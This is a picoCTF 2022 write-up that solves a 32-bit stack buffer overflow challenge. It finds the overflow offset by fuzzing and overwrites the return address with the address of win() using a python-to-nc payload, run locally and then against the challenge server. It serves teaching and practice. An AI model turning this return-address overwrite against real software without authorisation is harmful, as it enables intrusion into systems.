---
title: picoCTF 2022 - Buffer Overflow 1 
tags: [pico22, bof, pwn]
---

Let's gather some information before attempting to execute the binary

```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=96273c06a17ba29a34bdefa9be1a15436d5bad81, for GNU/Linux 3.2.0, not stripped

$ pwn checksec vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

We have a 32 bit ELF dynamically liked and not stripped. There's also no canary stack protection. Let's check the source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

We can clearly see that inside the `vuln()` function is used the `gets()` function that is notoriously vulnerable to buffer overflow. The buffer is 32 bytes long so with an input greater than that the program will write memory spaces over the buffer limits.

```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

We can also see that there's another function, that is never called, that prints out the flag

```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

With a buffer overflow we can overwrite the return address with the `win()` function address, and when the current function ends, the program will jump to it.

We can execute the binary and check its behaviour with inputs greater than 32 bytes.


```bash
$ python -c "print("A" * 32)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

$ python -c "print('A' * 36)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

$ python -c "print('A' * 40)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
zsh: done                python -c "print('A' * 40)" | 
zsh: segmentation fault  ./vuln
```

We can see that the program threw a segmentation fault: this indicates that the program overwritten some memory addresses that allowed it to function properly. We can also notice that the return addresses did not change. Let's try to give the program even larger inputs

```bash
$ python -c "print('A' * 44)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x8049300
zsh: done                python -c "print('A' * 44)" | 
zsh: segmentation fault  ./vuln

$ python -c "print('A' * 48)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
zsh: done                python -c "print('A' * 48)" | 
zsh: segmentation fault  ./vuln
```

With 48 bytes we can clearly see that the return address has been overwritten with `0x41414141` (hexadecimal representation for `AAAA`). What does this means? With 44 bytes we overwrite the stack to the very beginning of the `$eip` (return address) and each subsequent will override the register. We can confirm our hypotesis by giving the binary a 45 bytes input. If we are correct, we expect a single byte overflow

```bash
$ python -c "print('A' * 45)" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x8040041
zsh: done                python -c "print('A' * 45)" | 
zsh: segmentation fault  ./vuln
```

We can see that `$eip` was overwritten with only one `0x41`. Let's find out the `win()` function address

```bash
$ readelf -s vuln
63: 080491f6   139 FUNC    GLOBAL DEFAULT   13 win
```

We can create our payload and exploit the binary (remember to create the flag file `flag.txt` otherwise you will not see the result).

```bash
$ touch "Buffer Overflow HERE" >> flag.txt

$ python -c "print('A' * 44 + '\xf6\x91\x04\x08')" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Buffer Overflow HERE
zsh: done                python -c "print('A'*44 + '\xf6\x91\x04\x08')" | 
zsh: segmentation fault  ./vuln
```

Works like a charm. Let's exploit the remote service and get the flag.

```bash
$ python -c "print('A' * 44 + '\xf6\x91\x04\x08')" | nc saturn.picoctf.net 51539
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_[redacted]}
```